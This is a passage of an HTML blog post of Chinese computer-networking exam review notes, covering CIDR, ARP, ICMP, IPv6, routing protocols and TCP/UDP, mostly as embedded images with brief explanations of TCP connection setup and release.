src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221212028754.png" alt="image-20211221212028754"></p><h2 id="无分类编址CIDR"><a href="#无分类编址CIDR" class="headerlink" title="无分类编址CIDR"></a>无分类编址CIDR</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221212056825.png" alt="image-20211221212056825"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221212110726.png" alt="image-20211221212110726"></p><h3 id="路由聚合（超网）"><a href="#路由聚合（超网）" class="headerlink" title="路由聚合（超网）"></a>路由聚合（超网）</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221212227625.png" alt="image-20211221212227625"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221212240163.png" alt="image-20211221212240163"></p><h3 id="最长前缀匹配"><a href="#最长前缀匹配" class="headerlink" title="最长前缀匹配"></a>最长前缀匹配</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221213632138.png" alt="image-20211221213632138"></p><h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222190413093.png" alt="image-20211222190413093"></p><h3 id="ARP协议的过程"><a href="#ARP协议的过程" class="headerlink" title="ARP协议的过程"></a>ARP协议的过程</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222190442072.png" alt="image-20211222190442072"></p><p>要求能用自己的语言叙述</p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222190516799.png" alt="image-20211222190516799"></p><h2 id="DHCP协议"><a href="#DHCP协议" class="headerlink" title="DHCP协议"></a>DHCP协议</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222203136323.png" alt="image-20211222203136323"></p><h2 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222203215798.png" alt="image-20211222203215798"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222203227179.png" alt="image-20211222203227179"></p><h3 id="ICMP差错报文类型"><a href="#ICMP差错报文类型" class="headerlink" title="ICMP差错报文类型"></a>ICMP差错报文类型</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222203433044.png" alt="image-20211222203433044"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222203459435.png" alt="image-20211222203459435"></p><h3 id="不发送ICMP的情况"><a href="#不发送ICMP的情况" class="headerlink" title="不发送ICMP的情况"></a>不发送ICMP的情况</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222203658437.png" alt="image-20211222203658437"></p><h3 id="ICMP的应用"><a href="#ICMP的应用" class="headerlink" title="ICMP的应用"></a>ICMP的应用</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222203722098.png" alt="image-20211222203722098"></p><p>P148</p><h2 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222203756540.png" alt="image-20211222203756540"></p><h3 id="IPv6数据报格式"><a href="#IPv6数据报格式" class="headerlink" title="IPv6数据报格式"></a>IPv6数据报格式</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222203815912.png" alt="image-20211222203815912"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222203908758.png" alt="image-20211222203908758"></p><h3 id="IPv4和IPv6的对比"><a href="#IPv4和IPv6的对比" class="headerlink" title="IPv4和IPv6的对比"></a>IPv4和IPv6的对比</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222203935361.png" alt="image-20211222203935361"></p><h3 id="IPV6地址表示形式"><a href="#IPV6地址表示形式" class="headerlink" title="IPV6地址表示形式"></a>IPV6地址表示形式</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222204102761.png" alt="image-20211222204102761"></p><h3 id="IPV4到IPV6的过度"><a href="#IPV4到IPV6的过度" class="headerlink" title="IPV4到IPV6的过度"></a>IPV4到IPV6的过度</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222204341211.png" alt="image-20211222204341211"></p><h2 id="路由算法及分类"><a href="#路由算法及分类" class="headerlink" title="路由算法及分类"></a>路由算法及分类</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222204529635.png" alt="image-20211222204529635"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222204712958.png" alt="image-20211222204712958"></p><h2 id="RIP及其距离向量算法"><a href="#RIP及其距离向量算法" class="headerlink" title="RIP及其距离向量算法"></a>RIP及其距离向量算法</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222204726703.png" alt="image-20211222204726703"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222204740584.png" alt="image-20211222204740584"></p><h3 id="路由表的更新"><a href="#路由表的更新" class="headerlink" title="路由表的更新"></a>路由表的更新</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222204816791.png" alt="image-20211222204816791"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222204829864.png" alt="image-20211222204829864"></p><h4 id=""><a href="#" class="headerlink" title="**"></a>**</h4><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222204849281.png" alt="image-20211222204849281"></p><h3 id="RIP的报文格式"><a href="#RIP的报文格式" class="headerlink" title="RIP的报文格式"></a>RIP的报文格式</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222204912358.png" alt="image-20211222204912358"></p><h3 id="RIP的特点"><a href="#RIP的特点" class="headerlink" title="RIP的特点"></a>RIP的特点</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222205004270.png" alt="image-20211222205004270"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222205014842.png" alt="image-20211222205014842"></p><h2 id="OSPF协议及其链路状态算法"><a href="#OSPF协议及其链路状态算法" class="headerlink" title="OSPF协议及其链路状态算法"></a>OSPF协议及其链路状态算法</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222205109823.png" alt="image-20211222205109823"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222205119823.png" alt="image-20211222205119823"></p><h3 id="OSPF区域"><a href="#OSPF区域" class="headerlink" title="OSPF区域"></a>OSPF区域</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222205151529.png" alt="image-20211222205151529"></p><h3 id="OSPF数据报"><a href="#OSPF数据报" class="headerlink" title="OSPF数据报"></a>OSPF数据报</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222205209822.png" alt="image-20211222205209822"></p><h3 id="OSPF特点"><a href="#OSPF特点" class="headerlink" title="OSPF特点"></a>OSPF特点</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222205224386.png" alt="image-20211222205224386"></p><h2 id="外部路由器-网关-协议BGP"><a href="#外部路由器-网关-协议BGP" class="headerlink" title="外部路由器(网关)协议BGP"></a>外部路由器(网关)协议BGP</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222205317259.png" alt="image-20211222205317259"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222205359626.png" alt="image-20211222205359626"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222205418215.png" alt="image-20211222205418215"></p><h3 id="BGP协议特点"><a href="#BGP协议特点" class="headerlink" title="BGP协议特点"></a>BGP协议特点</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222205431498.png" alt="image-20211222205431498"></p><h3 id="BGP协议的四种报文"><a href="#BGP协议的四种报文" class="headerlink" title="BGP协议的四种报文"></a>BGP协议的四种报文</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222205453462.png" alt="image-20211222205453462"></p><h3 id="三种路由协议的比较"><a href="#三种路由协议的比较" class="headerlink" title="三种路由协议的比较"></a>三种路由协议的比较</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222205510633.png" alt="image-20211222205510633"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222205521445.png" alt="image-20211222205521445"></p><h2 id="第三章题目"><a href="#第三章题目" class="headerlink" title="第三章题目"></a>第三章题目</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222205944722.png" alt="image-20211222205944722"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222210017823.png" alt="image-20211222210017823"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222210101233.png" alt="image-20211222210101233"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222210600180.png" alt="image-20211222210600180"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211222210624056.png" alt="image-20211222210624056"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211223112642456.png" alt="image-20211223112642456"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211223113819440.png" alt="image-20211223113819440"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211223114909553.png" alt="image-20211223114909553"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211223114924986.png" alt="image-20211223114924986"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211223114958565.png" alt="image-20211223114958565"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211223115011322.png" alt="image-20211223115011322"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211223115030472.png" alt="image-20211223115030472"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211223115216956.png" alt="image-20211223115216956"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211223115303268.png" alt="image-20211223115303268"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211223115731840.png" alt="image-20211223115731840"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211223115745266.png" alt="image-20211223115745266"></p><h1 id="第四章：运输层"><a href="#第四章：运输层" class="headerlink" title="第四章：运输层"></a>第四章：运输层</h1><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229113412681.png" alt="image-20211229113412681"></p><h2 id="传输层概述"><a href="#传输层概述" class="headerlink" title="传输层概述"></a>传输层概述</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229113457034.png" alt="image-20211229113457034"></p><h2 id="传输层的两个协议"><a href="#传输层的两个协议" class="headerlink" title="传输层的两个协议"></a>传输层的两个协议</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229113522321.png" alt="image-20211229113522321"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229113629054.png" alt="image-20211229113629054"></p><h2 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229113649183.png" alt="image-20211229113649183"></p><h2 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229113740183.png" alt="image-20211229113740183"></p><h3 id="UDP首部"><a href="#UDP首部" class="headerlink" title="UDP首部"></a>UDP首部</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229113802627.png" alt="image-20211229113802627"></p><h3 id="UDP校验"><a href="#UDP校验" class="headerlink" title="UDP校验"></a>UDP校验</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229113829839.png" alt="image-20211229113829839"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229113908703.png" alt="image-20211229113908703"></p><h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229113929632.png" alt="image-20211229113929632"></p><h3 id="TCP报文段首部格式"><a href="#TCP报文段首部格式" class="headerlink" title="TCP报文段首部格式"></a>TCP报文段首部格式</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229114036712.png" alt="image-20211229114036712"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229114332062.png" alt="image-20211229114332062"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229114353213.png" alt="image-20211229114353213"></p><p>只有在请求连接和连接请求接受的时候，SYN=1，其他情况都是SYN=0</p><h2 id="TCP连接管理"><a href="#TCP连接管理" class="headerlink" title="TCP连接管理"></a>TCP连接管理</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229114654150.png" alt="image-20211229114654150"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229114705753.png" alt="image-20211229114705753"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229114713884.png" alt="image-20211229114713884"></p><h3 id="为什么TCP在连接的时候需要三次握手"><a href="#为什么TCP在连接的时候需要三次握手" class="headerlink" title="为什么TCP在连接的时候需要三次握手"></a>为什么TCP在连接的时候需要三次握手</h3><p>现在假设一种情况，现在有 客户端A 和 服务端B </p><p>现在A向B 发送连接请求P1，但是由于网络延迟，A未收到确认，以为报文丢失，于是A向B发送请求连接P2 , B收到后，返回给A 请求确认报文，现在A和B建立了连接。 </p><p>如果我们使用两次握手，那此时A和B使用请求连接P2进行通信。但是，如果此时P1到达B，则B以为是A又要请求连接于是，返回请求确认。但是，A是不使用这个连接通信的。此时B又为P1连接分配了缓存，这样就浪费了B的资源。</p><p>使用三层握手： 当B没有收到A的确认后，就不会建立连接。</p><h2 id="TCP连接释放"><a href="#TCP连接释放" class="headerlink" title="TCP连接释放"></a>TCP连接释放</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229121122630.png" alt="image-20211229121122630"></p><h3 id="语言描述："><a href="#语言描述：" class="headerlink" title="语言描述："></a>语言描述：</h3><p>1、A向B发送连接释放报文段</p><p>FIN = 1  seq=u</p><p>2、B返回一个确认报文段，此时A向B这个方向的连接就释放了—半关闭状态</p><p>ACK = 1 seq=v  ,ack = u +1</p><p>3、此时B向A发送连接释放报文段，主动关闭TCP连接</p><p>FIN = 1 ACK = 1 seq=w ack = u + 1</p><p>4、A回送一个确认报文段，在等到时间等待计时器设置的2MSL（最长报文段寿命）后，连接彻底关闭。</p><p>ACK=1, seq = u + 1,ack = w +1</p><h3 id="为什么要等待2MSL"><a href="#为什么要等待2MSL" class="headerlink" title="为什么要等待2MSL"></a>为什么要等待2MSL</h3><p>第一：</p><p>为了保证A发送的最后一个确认报文段能够到达B。</p><p>假设在B给A发送请求释放连接后，A发送确认后，就立即关闭。若此时A发送的确认报文段丢失，那么B收不到A的确认，但是A又已经关闭了连接。此时B以为自己向A发送的报文段有问题，会继续向A发送连接释放报文，但是A已经关闭了，于是B就没办法进入CLOSED状态。</p><p>若等待2MSL，当B再次重传后，A依然能够接受，再次等待2MSL，因此A和B就都能正常关闭了。</p><p>第二：</p><p>A在发送完最后的ACK后，在经过2MSL后，就可以使本连接持续的时间内所产生的所有报文段都从网络中消失。</p><h2 id="TCP可靠传输"><a href="#TCP可靠传输" class="headerlink" title="TCP可靠传输"></a>TCP可靠传输</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229124324093.png" alt="image-20211229124324093"></p><h3 id="校验"><a href="#校验" class="headerlink" title="校验"></a>校验</h3><p>与UDP交易一样，增加伪首部</p><h3 id="序号"><a href="#序号" class="headerlink" title="序号"></a>序号</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229124514336.png" alt="image-20211229124514336"></p><h3 id="确认"><a href="#确认" class="headerlink" title="确认"></a>确认</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229124715794.png" alt="image-20211229124715794"></p><h3 id="重传"><a href="#重传" class="headerlink" title="重传"></a>重传</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229124736880.png" alt="image-20211229124736880"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229124746610.png" alt="image-20211229124746610"></p><p>出现三个冗余的确认后，就立即重传</p><h2 id="TCP流量控制"><a href="#TCP流量控制" class="headerlink" title="TCP流量控制"></a>TCP流量控制</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229124831250.png" alt="image-20211229124831250"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229124841030.png" alt="image-20211229124841030"></p><p>具体细节，参见第三章的滑动窗口。</p><h2 id="TCP拥塞控制"><a href="#TCP拥塞控制" class="headerlink" title="TCP拥塞控制"></a>TCP拥塞控制</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229124918230.png" alt="image-20211229124918230"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229124929455.png" alt="image-20211229124929455"></p><h3 id="慢开始和拥塞避免"><a href="#慢开始和拥塞避免" class="headerlink" title="慢开始和拥塞避免"></a>慢开始和拥塞避免</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229124938437.png" alt="image-20211229124938437"></p><h3 id="快重传和快恢复"><a href="#快重传和快恢复" class="headerlink" title="快重传和快恢复"></a>快重传和快恢复</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211229124944129.png" alt="image-20211229124944129"></p><h1 id="第五章：应用层"><a href="#第五章：应用层" class="headerlink" title="第五章：应用层"></a>第五章：应用层</h1><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211224124803148.png" alt="image-20211224124803148"></p><h2 id="应用层概述"><a href="#应用层概述" class="headerlink" title="应用层概述"></a>应用层概述</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211224124816207.png" alt="image-20211224124816207"></p><h2 id="网络应用模型"><a href="#网络应用模型" class="headerlink" title="网络应用模型"></a>网络应用模型</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211224124840268.png" 